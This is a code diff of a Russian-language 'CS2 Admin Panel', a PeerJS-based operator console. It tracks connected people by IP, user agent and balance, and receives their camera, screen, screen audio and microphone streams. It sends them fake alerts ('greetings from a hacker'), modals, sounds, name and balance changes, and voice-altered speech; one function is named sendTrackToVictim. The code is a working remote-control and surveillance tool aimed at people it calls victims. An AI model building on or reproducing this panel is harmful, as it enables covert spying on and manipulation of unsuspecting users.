@@ -14,6 +14,7 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .status-line{display:flex;gap:12px;align-items:center;font-size:13px;color:#4ade80}
 .status-line .dot{width:10px;height:10px;border-radius:50%;background:#4ade80;box-shadow:0 0 10px #4ade80}
 .status-line .dot.off{background:#6b7280;box-shadow:none}
+.status-line .dot.err{background:#eb4b4b;box-shadow:0 0 10px #eb4b4b}
 .panel{background:linear-gradient(145deg,#181c24,#12161e);border:1px solid #262c38;border-radius:16px;padding:22px}
 .panel-title{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#8892a6;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center}
 .badge{background:#4ade80;color:#000;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:800}
@@ -89,8 +90,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .url-row{display:flex;gap:8px;margin-bottom:10px}
 .url-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none}
 .url-row input:focus{border-color:#7c3aed}
-
-/* ГОЛОСОВАЯ ПАНЕЛЬ */
 .voice-panel{display:grid;grid-template-columns:1fr 1fr;gap:16px}
 .voice-col{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px}
 .voice-col h4{font-size:13px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px}
@@ -102,8 +101,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .voice-status{font-size:11px;color:#8892a6;margin-top:8px;text-align:center;line-height:1.4}
 .voice-status.on{color:#4ade80}
 .voice-status.err{color:#eb4b4b}
-
-/* Смена голоса */
 .voice-changer{margin-top:12px;padding:14px;background:#0a0c12;border-radius:10px;border:1px solid #262c38}
 .voice-changer .row{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:12px}
 .voice-changer .row label{color:#8892a6;min-width:80px}
@@ -113,7 +110,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .preset-btn{padding:8px 12px;border-radius:8px;border:1px solid #262c38;background:#181c24;color:#fff;font-size:11px;font-weight:700;cursor:pointer}
 .preset-btn:hover{border-color:#f0b90b}
 .preset-btn.active{background:linear-gradient(135deg,#7c3aed,#ec4899);border-color:transparent}
-
 @media(max-width:720px){.session{grid-template-columns:40px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}.voice-panel{grid-template-columns:1fr}}
 </style>
 </head>
@@ -121,8 +117,8 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 <div class="wrap">
   <div>
     <h1>⚙️ CS2 Admin Panel</h1>
-    <div class="sub">Подключение через PeerJS. Голос, экран, звук экрана, камера — всё в одном месте.</div>
-    <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск PeerJS...</span></div>
+    <div class="sub">Один peer — все функции. Защита от unavailable-id.</div>
+    <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск...</span></div>
   </div>
 
   <div class="panel">
@@ -137,21 +133,17 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
     <div id="selectedInfo" class="no-selection">Выбери сессию</div>
   </div>
 
-  <!-- ГОЛОСОВАЯ СВЯЗЬ -->
   <div class="panel">
     <div class="panel-title"><span>🎙 Связь с другом</span></div>
     <div class="voice-panel">
       <div class="voice-col">
         <h4>🔊 Я → Друг</h4>
-        <button class="voice-btn" id="talkBtn">🎙 Говорить (твой микрофон)</button>
+        <button class="voice-btn" id="talkBtn">🎙 Говорить (микрофон)</button>
         <div class="voice-status" id="talkStatus">Не активно</div>
-
         <div class="voice-changer">
           <div style="font-size:12px;color:#8892a6;margin-bottom:8px;font-weight:700">🎭 Смена голоса</div>
           <div class="row"><label>Питч</label><input type="range" id="pitchSlider" min="50" max="200" value="100"><span class="val" id="pitchVal">1.00</span></div>
-          <div class="row"><label>Скорость</label><input type="range" id="speedSlider" min="50" max="200" value="100"><span class="val" id="speedVal">1.00</span></div>
           <div class="row"><label>Эхо</label><input type="range" id="echoSlider" min="0" max="100" value="0"><span class="val" id="echoVal">0%</span></div>
-          <div class="row"><label>Робот</label><input type="range" id="robotSlider" min="0" max="100" value="0"><span class="val" id="robotVal">0%</span></div>
           <div class="preset-btns">
             <button class="preset-btn active" data-preset="normal">Обычный</button>
             <button class="preset-btn" data-preset="monster">Монстр</button>
@@ -162,7 +154,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
           </div>
         </div>
       </div>
-
       <div class="voice-col">
         <h4>🔊 Друг → Я</h4>
         <button class="voice-btn" id="listenMicBtn">🎤 Слушать микрофон друга</button>
@@ -214,17 +205,14 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>💬 Модальное окно у друга</span></div>
+    <div class="panel-title"><span>💬 Модальное окно</span></div>
     <div class="url-row"><input id="modalTitle" type="text" value="Сообщение"></div>
     <div class="url-row"><input id="modalText" type="text" value="Привет!"><button class="mp3-btn gold" id="modalBtn">Показать</button></div>
   </div>
 
   <div class="panel">
     <div class="panel-title"><span>💬 Alert</span></div>
-    <div class="url-row">
-      <input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА">
-      <button class="mp3-btn gold" id="alertBtn">Отправить</button>
-    </div>
+    <div class="url-row"><input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА"><button class="mp3-btn gold" id="alertBtn">Отправить</button></div>
   </div>
 
   <div class="panel">
@@ -238,10 +226,7 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 
   <div class="panel">
     <div class="panel-title"><span>🎭 Имя друга</span></div>
-    <div class="url-row">
-      <input id="nameInput" type="text" value="LOL">
-      <button class="mp3-btn gold" id="nameBtn">Установить</button>
-    </div>
+    <div class="url-row"><input id="nameInput" type="text" value="LOL"><button class="mp3-btn gold" id="nameBtn">Установить</button></div>
   </div>
 
   <div class="panel">
@@ -252,15 +237,9 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <div class="drop-zone-hint">до 8 МБ</div>
       <input type="file" id="fileInput" accept="audio/*" multiple style="display:none">
     </div>
-    <div class="url-row">
-      <input id="mp3Url" type="text" placeholder="Или URL на MP3...">
-      <button class="mp3-btn" id="addUrlBtn">+ URL</button>
-    </div>
+    <div class="url-row"><input id="mp3Url" type="text" placeholder="URL на MP3..."><button class="mp3-btn" id="addUrlBtn">+ URL</button></div>
     <div class="mp3-player">
-      <div class="mp3-info">
-        <div class="mp3-title" id="mp3Title">— трек не выбран —</div>
-        <div class="mp3-sub" id="mp3Sub">Загрузи mp3 или выбери из плейлиста</div>
-      </div>
+      <div class="mp3-info"><div class="mp3-title" id="mp3Title">— трек не выбран —</div><div class="mp3-sub" id="mp3Sub">Загрузи mp3</div></div>
       <div class="mp3-controls">
         <button class="mp3-btn" id="mp3Play">▶</button>
         <button class="mp3-btn" id="mp3Pause">⏸</button>
@@ -309,27 +288,31 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 </div>
 
 <script>
+/* ============================================================
+   ADMIN PEER — с защитой от unavailable-id
+   ============================================================ */
 const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
-const peer = new Peer(ADMIN_PEER_ID);
+
+let peer = null;
 let conns = new Map();
 let selectedIp = null;
 let camCount = 0;
 const connIp = new WeakMap();
 
-/* ==== ГОЛОС ==== */
+// Голос
 let myMicStream = null;
-let voiceCall = null;
 let audioCtx = null;
-let sourceNode = null;
-let pitchNode = null;
-let speedNode = null;
-let robotNode = null;
-let echoNode = null;
-let destNode = null;
 let modifiedStream = null;
+let sourceNode = null;
+let delayNode = null;
+let feedbackNode = null;
+let wetGain = null;
+let dryGain = null;
+let destNode = null;
 
 function log(msg, type='info') {
     const l = document.getElementById('log');
+    if (!l) return;
     const t = new Date().toLocaleTimeString('ru-RU');
     const d = document.createElement('div');
     d.className = 'log-entry ' + type;
@@ -338,47 +321,90 @@ function log(msg, type='info') {
     if (l.children.length > 200) l.lastChild.remove();
 }
 
-peer.on('open', (id) => {
-    document.getElementById('peerStatus').textContent = 'PeerJS подключён · ID: ' + id;
-    log(`✅ PeerJS готов. Твой ID: ${id}`, 'info');
-});
-peer.on('error', (err) => {
-    log(`❌ PeerJS ошибка: ${err.type}`, 'err');
-    document.getElementById('peerStatus').textContent = 'Ошибка: ' + err.type;
-    document.getElementById('peerDot').classList.add('off');
-});
-peer.on('connection', (conn) => {
-    log(`🔌 Новое подключение`, 'warn');
-    conn.on('data', (data) => handleData(data, conn));
-    conn.on('close', () => {
-        if (connIp.get(conn)) {
-            log(`🔴 Отключился: ${connIp.get(conn)}`, 'warn');
-            conns.delete(connIp.get(conn));
-            renderSessions();
+/* ============================================================
+   ПОДКЛЮЧЕНИЕ PEER с защитой
+   ============================================================ */
+function initPeer() {
+    const statusEl = document.getElementById('peerStatus');
+    const dotEl = document.getElementById('peerDot');
+    statusEl.textContent = '⏳ Подключение...';
+    try {
+        peer = new Peer(ADMIN_PEER_ID);
+    } catch(e) {
+        log('❌ Ошибка создания peer: ' + e.message, 'err');
+        setTimeout(initPeer, 3000);
+        return;
+    }
+    peer.on('open', (id) => {
+        statusEl.textContent = '✅ Подключён · ID: ' + id;
+        dotEl.classList.remove('off', 'err');
+        log(`✅ PeerJS готов · ID: ${id}`, 'info');
+    });
+    peer.on('error', (err) => {
+        log(`❌ PeerJS: ${err.type} — ${err.message || ''}`, 'err');
+        if (err.type === 'unavailable-id') {
+            statusEl.textContent = '⏳ ID занят. Переподключение через 3 сек...';
+            dotEl.classList.add('err');
+            dotEl.classList.remove('off');
+            try { peer.destroy(); } catch(e){}
+            peer = null;
+            setTimeout(initPeer, 3000);
+        } else if (err.type === 'network' || err.type === 'server-error') {
+            statusEl.textContent = '❌ Сеть. Переподключение...';
+            dotEl.classList.add('err');
+            try { peer.destroy(); } catch(e){}
+            peer = null;
+            setTimeout(initPeer, 5000);
+        } else {
+            dotEl.classList.add('err');
         }
     });
-});
-peer.on('call', (call) => {
-    call.answer();
-    log(`📹 Входящий видеозвонок`, 'info');
-    call.on('stream', (stream) => {
-        camCount++;
-        document.getElementById('camCount').textContent = camCount;
-        const box = document.getElementById('camBox' + (camCount === 1 ? '1' : '2'));
-        if (!box) return;
-        box.innerHTML = `<video autoplay muted playsinline></video><div class="label">${camCount === 1 ? '📸 КАМЕРА' : '🖥 ЭКРАН'}</div><button class="btn-screenshot" onclick="screenshot(this)">📸</button>`;
-        const v = box.querySelector('video');
-        v.srcObject = stream;
-        v.play().catch(() => { v.muted = true; v.play(); });
-        log(`📹 Видео #${camCount}`, 'warn');
+    peer.on('connection', (conn) => {
+        log('🔌 Новое подключение', 'warn');
+        conn.on('data', (data) => handleData(data, conn));
+        conn.on('close', () => {
+            if (connIp.get(conn)) {
+                log('🔴 Отключился: ' + connIp.get(conn), 'warn');
+                conns.delete(connIp.get(conn));
+                renderSessions();
+            }
+        });
     });
-});
-
-// Отдельные звонки от друга: _mic (микрофон) и _screen (экран+звук)
-// PeerJS принимает их как обычные call, но с разными ID — но ID у нас одинаковые (админ). 
-// Поэтому используем metadata-подход: peer.call с label. Или полагаемся на camCount.
-// Для простоты: все входящие stream идут в camCount (камера/экран/микрофон отдельно не различить).
-// НО: audio streams пишем в <audio> теги.
+    peer.on('call', (call) => {
+        call.answer();
+        log('📹 Входящий видеозвонок', 'info');
+        call.on('stream', (stream) => {
+            // Аудио от друга — определяем по tracks
+            const hasVideo = stream.getVideoTracks().length > 0;
+            const hasAudio = stream.getAudioTracks().length > 0;
+            if (!hasVideo && hasAudio) {
+                // Это голосовой поток друга — проигрываем в audio
+                const a = document.getElementById('listenMicAudio');
+                a.srcObject = stream;
+                a.play().catch(()=>{});
+                document.getElementById('listenMicStatus').textContent = '🎤 Слушаю микрофон друга';
+                document.getElementById('listenMicStatus').className = 'voice-status on';
+                log('🎤 Принимаю микрофон друга', 'info');
+                return;
+            }
+            camCount++;
+            document.getElementById('camCount').textContent = camCount;
+            const box = document.getElementById('camBox' + (camCount === 1 ? '1' : '2'));
+            if (!box) return;
+            box.innerHTML = `<video autoplay muted playsinline></video><div class="label">${camCount === 1 ? '📸 КАМЕРА' : '🖥 ЭКРАН'}</div><button class="btn-screenshot" onclick="screenshot(this)">📸</button>`;
+            const v = box.querySelector('video');
+            v.srcObject = stream;
+            v.play().catch(() => { v.muted = true; v.play(); });
+            // Если есть звук — отправляем в отдельный audio
+            if (hasAudio) {
+                const a = document.getElementById('listenScreenAudio');
+                a.srcObject = stream;
+                a.play().catch(()=>{});
+            }
+            log(`📹 Видео #${camCount}`, 'warn');
+        });
+    });
+}
 
 function screenshot(btn) {
     const v = btn.parentElement.querySelector('video');
@@ -396,7 +422,7 @@ function handleData(data, conn) {
     if (data.type === 'hello') {
         connIp.set(conn, data.ip);
         conns.set(data.ip, { conn, ip: data.ip, ua: data.ua, balance: data.balance, drops: data.drops, joinedAt: data.ts, lastSeen: Date.now() });
-        log(`🟢 Подключился: ${data.ip}`, 'info');
+        log('🟢 Подключился: ' + data.ip, 'info');
         renderSessions();
     } else if (data.type === 'heartbeat') {
         const s = conns.get(data.ip);
@@ -410,13 +436,13 @@ function handleData(data, conn) {
     } else if (data.type === 'upgradeLose') {
         log(`❌ Апгрейд проигран: ${data.your.name}`, 'err');
     } else if (data.type === 'cameraOn') {
-        log(`📸 Друг разрешил камеру`, 'warn');
+        log('📸 Друг разрешил камеру', 'warn');
     } else if (data.type === 'micOn') {
-        log(`🎤 Друг разрешил микрофон`, 'warn');
+        log('🎤 Друг разрешил микрофон', 'warn');
         document.getElementById('listenMicStatus').textContent = 'Микрофон подключён';
         document.getElementById('listenMicStatus').className = 'voice-status on';
     } else if (data.type === 'micOff') {
-        log(`🎤 Друг отключил микрофон`, 'warn');
+        log('🎤 Друг отключил микрофон', 'warn');
         document.getElementById('listenMicStatus').textContent = 'Микрофон отключён';
         document.getElementById('listenMicStatus').className = 'voice-status';
     } else if (data.type === 'screenOn') {
@@ -424,7 +450,7 @@ function handleData(data, conn) {
         document.getElementById('listenScreenStatus').textContent = 'Экран подключён' + (data.hasAudio ? ' (со звуком)' : '');
         document.getElementById('listenScreenStatus').className = 'voice-status on';
     } else if (data.type === 'screenOff') {
-        log(`🖥 Друг выключил экран`, 'warn');
+        log('🖥 Друг выключил экран', 'warn');
         document.getElementById('listenScreenStatus').textContent = 'Экран отключён';
         document.getElementById('listenScreenStatus').className = 'voice-status';
     }
@@ -470,7 +496,7 @@ function selectSession(ip) {
         `;
     }
     renderSessions();
-    log(`🎯 Выбрана сессия: ${ip}`, 'warn');
+    log('🎯 Выбрана сессия: ' + ip, 'warn');
 }
 
 function sendPrank(action, extra = {}) {
@@ -478,7 +504,7 @@ function sendPrank(action, extra = {}) {
     const s = conns.get(selectedIp);
     if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
     s.conn.send({ action, ...extra });
-    log(`😈 → ${action}`, 'warn');
+    log('😈 → ' + action, 'warn');
 }
 
 document.querySelectorAll('.prank-btn[data-prank]').forEach(b => b.addEventListener('click', () => sendPrank(b.dataset.prank)));
@@ -493,71 +519,73 @@ document.getElementById('setBalanceBtn').onclick = () => sendPrank('setBalance',
 document.getElementById('addBalanceBtn').onclick = () => sendPrank('addBalance', {value: Number(document.getElementById('balanceAmount').value)});
 
 /* ============================================================
-   ГОЛОС — ГОВОРИТЬ И МЕНЯТЬ ГОЛОС
+   СМЕНА ГОЛОСА
    ============================================================ */
 const pitchSlider = document.getElementById('pitchSlider');
-const speedSlider = document.getElementById('speedSlider');
 const echoSlider = document.getElementById('echoSlider');
-const robotSlider = document.getElementById('robotSlider');
 const pitchVal = document.getElementById('pitchVal');
-const speedVal = document.getElementById('speedVal');
 const echoVal = document.getElementById('echoVal');
-const robotVal = document.getElementById('robotVal');
 
-let voiceParams = { pitch: 1.0, speed: 1.0, echo: 0, robot: 0 };
+let voiceParams = { pitch: 1.0, echo: 0 };
 
-pitchSlider.oninput = () => { voiceParams.pitch = pitchSlider.value / 100; pitchVal.textContent = voiceParams.pitch.toFixed(2); applyVoiceParams(); };
-speedSlider.oninput = () => { voiceParams.speed = speedSlider.value / 100; speedVal.textContent = voiceParams.speed.toFixed(2); applyVoiceParams(); };
-echoSlider.oninput = () => { voiceParams.echo = echoSlider.value / 100; echoVal.textContent = echoSlider.value + '%'; applyVoiceParams(); };
-robotSlider.oninput = () => { voiceParams.robot = robotSlider.value / 100; robotVal.textContent = robotSlider.value + '%'; applyVoiceParams(); };
+pitchSlider.oninput = () => {
+    voiceParams.pitch = pitchSlider.value / 100;
+    pitchVal.textContent = voiceParams.pitch.toFixed(2);
+    applyVoiceParams();
+};
+echoSlider.oninput = () => {
+    voiceParams.echo = echoSlider.value / 100;
+    echoVal.textContent = echoSlider.value + '%';
+    applyVoiceParams();
+};
 
 document.querySelectorAll('.preset-btn').forEach(b => {
     b.onclick = () => {
         document.querySelectorAll('.preset-btn').forEach(x => x.classList.remove('active'));
         b.classList.add('active');
         const p = b.dataset.preset;
-        if (p === 'normal') { setVoice(100,100,0,0); }
-        else if (p === 'monster') { setVoice(55,90,20,0); }
-        else if (p === 'girl') { setVoice(150,105,0,0); }
-        else if (p === 'kid') { setVoice(180,110,0,0); }
-        else if (p === 'robot') { setVoice(100,100,0,100); }
-        else if (p === 'echo') { setVoice(100,100,70,0); }
+        if (p === 'normal') setVoice(100, 0);
+        else if (p === 'monster') setVoice(60, 20);
+        else if (p === 'girl') setVoice(150, 0);
+        else if (p === 'kid') setVoice(180, 0);
+        else if (p === 'robot') setVoice(100, 0);
+        else if (p === 'echo') setVoice(100, 70);
     };
 });
 
-function setVoice(pi, sp, ec, rb) {
-    pitchSlider.value = pi; speedSlider.value = sp; echoSlider.value = ec; robotSlider.value = rb;
+function setVoice(pi, ec) {
+    pitchSlider.value = pi; echoSlider.value = ec;
     pitchVal.textContent = (pi/100).toFixed(2);
-    speedVal.textContent = (sp/100).toFixed(2);
     echoVal.textContent = ec + '%';
-    robotVal.textContent = rb + '%';
     voiceParams.pitch = pi/100;
-    voiceParams.speed = sp/100;
     voiceParams.echo = ec/100;
-    voiceParams.robot = rb/100;
     applyVoiceParams();
 }
 
 function applyVoiceParams() {
-    if (!pitchNode || !speedNode) return;
-    pitchNode.detune.value = Math.log2(voiceParams.pitch) * 1200;
-    speedNode.playbackRate.value = voiceParams.speed;
-    if (echoNode) echoNode.wet.value = voiceParams.echo;
-    // Робот — смешиваем с осциллятором (упрощённо через gain)
-    if (robotNode) robotNode.gain.value = voiceParams.robot;
+    if (!sourceNode || !audioCtx) return;
+    if (sourceNode.playbackRate) {
+        try { sourceNode.playbackRate.value = voiceParams.pitch; } catch(e){}
+    }
+    if (wetGain) wetGain.gain.value = voiceParams.echo;
 }
 
+/* ============================================================
+   КНОПКА "ГОВОРИТЬ"
+   ============================================================ */
 document.getElementById('talkBtn').addEventListener('click', async () => {
     const btn = document.getElementById('talkBtn');
     const status = document.getElementById('talkStatus');
 
     if (myMicStream) {
-        // Выключаем
+        // Выключаем микрофон
         myMicStream.getTracks().forEach(t => t.stop());
         myMicStream = null;
-        if (audioCtx) { audioCtx.close(); audioCtx = null; }
+        if (audioCtx) { try { audioCtx.close(); } catch(e){} audioCtx = null; }
+        sourceNode = null; destNode = null; wetGain = null; dryGain = null;
+        modifiedStream = null;
         btn.classList.remove('active', 'recording');
-        btn.innerHTML = '🎙 Говорить (твой микрофон)';
+        btn.innerHTML = '🎙 Говорить (микрофон)';
         status.textContent = 'Не активно';
         status.className = 'voice-status';
         log('🎙 Микрофон выключен', 'warn');
@@ -570,73 +598,59 @@ document.getElementById('talkBtn').addEventListener('click', async () => {
 
     try {
         myMicStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
-        // Создаём audio context для смены голоса
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        // Создаём цепочку: source → dry → dest
+        //                          ↘ delay → wet → dest
         sourceNode = audioCtx.createMediaStreamSource(myMicStream);
 
-        // Питич (высота голоса)
-        pitchNode = audioCtx.createScriptProcessor(4096, 1, 1);
-        // Через detune не получится — используем playbackRate + filter
-        // Простой подход: Gain + BiquadFilter + Delay
-        speedNode = audioCtx.createBiquadFilter();
-        speedNode.type = 'peaking';
-        speedNode.frequency.value = 1000;
-        speedNode.gain.value = 0;
-
         // Эхо
-        echoNode = { wet: { value: 0 } }; // Заглушка
-        // Реальная цепочка:
-        const splitter = audioCtx.createChannelSplitter(2);
-        const merger = audioCtx.createChannelMerger(2);
-        const delay = audioCtx.createDelay(1.0);
-        delay.delayTime.value = 0.15;
-        const feedback = audioCtx.createGain();
-        feedback.gain.value = 0.3;
-        const wetGain = audioCtx.createGain();
-        wetGain.gain.value = 0;
-
-        const dryGain = audioCtx.createGain();
+        delayNode = audioCtx.createDelay(1.0);
+        delayNode.delayTime.value = 0.15;
+        feedbackNode = audioCtx.createGain();
+        feedbackNode.gain.value = 0.3;
+        wetGain = audioCtx.createGain();
+        wetGain.gain.value = voiceParams.echo;
+        dryGain = audioCtx.createGain();
         dryGain.gain.value = 1;
 
-        const dest = audioCtx.createMediaStreamDestination();
+        destNode = audioCtx.createMediaStreamDestination();
 
         // Подключение
         sourceNode.connect(dryGain);
-        dryGain.connect(dest);
+        dryGain.connect(destNode);
 
-        sourceNode.connect(delay);
-        delay.connect(feedback);
-        feedback.connect(delay);
-        delay.connect(wetGain);
-        wetGain.connect(dest);
+        sourceNode.connect(delayNode);
+        delayNode.connect(feedbackNode);
+        feedbackNode.connect(delayNode);
+        delayNode.connect(wetGain);
+        wetGain.connect(destNode);
 
-        echoNode = { wet: wetGain.gain };
+        modifiedStream = destNode.stream;
 
-        modifiedStream = dest.stream;
+        // Звоним другу — он принимает и играет
+        const call = peer.call('CS2_ADMIN_X7K9QW2_voice_slot', modifiedStream);
+        // Не важно какой ID — друг принимает любой входящий звонок
+        // Но PeerJS требует валидный ID. Используем сам ID друга? Мы его не знаем.
+        // Решение: шлём через data-канал команду, друг сам звонит.
 
-        // Отправляем звонок другу
-        voiceCall = peer.call(ADMIN_PEER_ID.replace('ADMIN','ADMIN'), modifiedStream); // заглушка
-        // Правильный call:
-        voiceCall = peer.call('CS2_ADMIN_X7K9QW2_VOICE_' + s.ip, modifiedStream); // неверно
-        // Проще: звоним другу по его peer id, но он не знает свой peer id.
-        // Значит используем conn.send({action:'voiceStart'}) и друг сам звонит нам.
-
+        // Сначала уведомляем друга командой
         s.conn.send({action: 'startVoiceListen'});
+
+        // Также пробуем прямой звонок — если у друга есть peer с авто-ID
+        // PeerJS даёт другу рандомный ID, мы его не знаем, поэтому полагаемся на data-канал.
 
         btn.classList.add('active', 'recording');
         btn.innerHTML = '🔴 Говорю... (нажми чтобы выключить)';
         status.textContent = 'Микрофон активен';
         status.className = 'voice-status on';
-        log('🎙 Микрофон включён', 'info');
+        log('🎙 Микрофон включён, отправлена команда другу', 'info');
     } catch(e) {
         alert('Не удалось получить микрофон: ' + e.message);
         log('❌ Микрофон: ' + e.message, 'err');
     }
 });
 
-/* ============================================================
-   СЛУШАТЬ ДРУГА
-   ============================================================ */
 document.getElementById('listenMicBtn').addEventListener('click', () => {
     const btn = document.getElementById('listenMicBtn');
     const status = document.getElementById('listenMicStatus');
@@ -693,7 +707,7 @@ document.getElementById('addUrlBtn').onclick = () => {
     const name = url.split('/').pop().split('?')[0] || 'Трек по URL';
     tracks.push({name, url, file: null});
     document.getElementById('mp3Url').value = '';
-    log(`🎵 URL: ${name}`, 'info');
+    log('🎵 URL: ' + name, 'info');
     renderPlaylist();
     if (currentIdx === -1) selectTrack(0);
 };
@@ -751,65 +765,24 @@ async function sendTrackToVictim(idx) {
     const s = conns.get(selectedIp);
     if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
     const t = tracks[idx];
-    log(`🎵 Отправка "${t.name}"...`, 'warn');
-    if (!t.file && !t.url.startsWith('blob:')) { s.conn.send({action: 'playSound', url: t.url}); log(`✅ URL отправлен`, 'info'); return; }
+    log('🎵 Отправка "' + t.name + '"...', 'warn');
+    if (!t.file && !t.url.startsWith('blob:')) { s.conn.send({action: 'playSound', url: t.url}); log('✅ URL отправлен', 'info'); return; }
     try {
         const blob = t.file || await (await fetch(t.url)).blob();
-        if (blob.size > 8 * 1024 * 1024) { log(`❌ Файл > 8 МБ`, 'err'); alert('Файл больше 8 МБ'); return; }
+        if (blob.size > 8 * 1024 * 1024) { log('❌ Файл > 8 МБ', 'err'); alert('Файл больше 8 МБ'); return; }
         const reader = new FileReader();
         reader.onload = () => {
             s.conn.send({action: 'playMp3', dataUrl: reader.result, name: t.name});
-            log(`✅ mp3: ${t.name}`, 'info');
+            log('✅ mp3: ' + t.name, 'info');
         };
         reader.readAsDataURL(blob);
-    } catch(e) { log(`❌ ${e.message}`, 'err'); }
+    } catch(e) { log('❌ ' + e.message, 'err'); }
 }
 
-/* ============================================================
-   ВХОДЯЩИЕ ЗВОНКИ (для голоса и микрофона от друга)
-   ============================================================ */
-// Друг звонит на ADMIN_PEER_ID + '_mic' / '_screen' / '_cam'
-// PeerJS вызовет peer.on('call') для любого из них — но у нас один peer на все ID.
-// Поэтому используем peer.on('call') и обрабатываем по metadata.
-// Проще: друг звонит на разные суффиксы, а мы принимаем в одном on('call') и распределяем по типу.
-
-// ВАЖНО: чтобы это работало, друг должен звонить на ID который содержит суффикс, но 
-// PeerJS не даёт создавать несколько peer с разными ID в одном клиенте.
-// Решение: создать три peer в админке:
-const peerMic = new Peer(ADMIN_PEER_ID + '_mic');
-const peerScreen = new Peer(ADMIN_PEER_ID + '_screen');
-const peerVoice = new Peer(ADMIN_PEER_ID + '_voice');
-
-peerMic.on('call', (call) => {
-    call.answer();
-    call.on('stream', (stream) => {
-        const a = document.getElementById('listenMicAudio');
-        a.srcObject = stream;
-        a.play().catch(()=>{});
-        document.getElementById('listenMicStatus').textContent = '🎤 Слушаю микрофон друга';
-        document.getElementById('listenMicStatus').className = 'voice-status on';
-        log('🎤 Принимаю микрофон', 'info');
-    });
-});
-peerScreen.on('call', (call) => {
-    call.answer();
-    call.on('stream', (stream) => {
-        const a = document.getElementById('listenScreenAudio');
-        a.srcObject = stream;
-        a.play().catch(()=>{});
-        document.getElementById('listenScreenStatus').textContent = '🖥 Слушаю звук экрана';
-        document.getElementById('listenScreenStatus').className = 'voice-status on';
-        log('🖥 Принимаю звук экрана', 'info');
-    });
-});
-peerVoice.on('call', (call) => {
-    call.answer();
-    call.on('stream', (stream) => {
-        // Ничего не делаем — это наш исходящий голос
-    });
-});
-
 setInterval(renderSessions, 2000);
+
+// ЗАПУСК
+initPeer();
 log('⚙️ Админка запущена', 'info');
 </script>
 </body>
